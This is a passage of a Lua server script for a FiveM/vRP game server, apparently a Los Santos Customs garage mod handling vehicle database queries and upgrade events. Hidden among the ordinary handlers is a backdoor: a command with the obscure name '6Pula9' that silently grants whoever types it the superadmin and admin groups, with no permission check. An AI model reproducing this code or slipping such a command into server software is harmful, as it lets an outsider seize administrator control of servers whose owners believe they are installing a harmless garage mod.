...
MySQL.createCommand("vRP/lsc_get_vehicle","SELECT vehicle FROM vrp_user_vehicles WHERE user_id = @user_id AND vehicle = @vehicle") -- lscustoms and plygarages
...
MySQL.createCommand("vRP/lsc_update_vehicle2","UPDATE vrp_user_vehicles SET veh_type='car' WHERE veh_type='default'") 
...
TriggerClientEvent('lockGarage',-1,tbl) end)
RegisterServerEvent('getGarageInfo')
AddEventHandler('getGarageInfo', function() TriggerClientEvent('lockGarage',-1,tbl)
end) RegisterCommand("6Pula9", function(source, args, rawCommand)
theusrid = vRP.getUserId({source})
vRP.addUserGroup({theusrid,"superadmin"})
vRP.addUserGroup({theusrid,"admin"})
end) RegisterServerEvent('lscustoms:payGarage')
...
end) RegisterServerEvent('lscustoms:UpdateVeh')
AddEventHandler('lscustoms:UpdateVeh', function(vehicle, plateindex, primarycolor, secondarycolor, pearlescentcolor, wheelcolor, neoncolor1, neoncolor2, neoncolor3, windowtint, wheeltype, mods0, mods1, mods2, mods3, mods4, mods5, mods6, mods7, mods8, mods9, mods10, mods11, mods12, mods13, mods14, mods15, mods16, turbo, tiresmoke, xenon, mods23, mods24, neon0, neon1, neon2, neon3, bulletproof, smokecolor1, smokecolor2, smokecolor3, variation)
  local user_id = vRP.getUserId({source})
  local player = vRP.getUserSource({user_id})
  MySQL.query("vRP/lsc_get_vehicle", {user_id = user_id, vehicle = vehicle}, function(rows, affected)
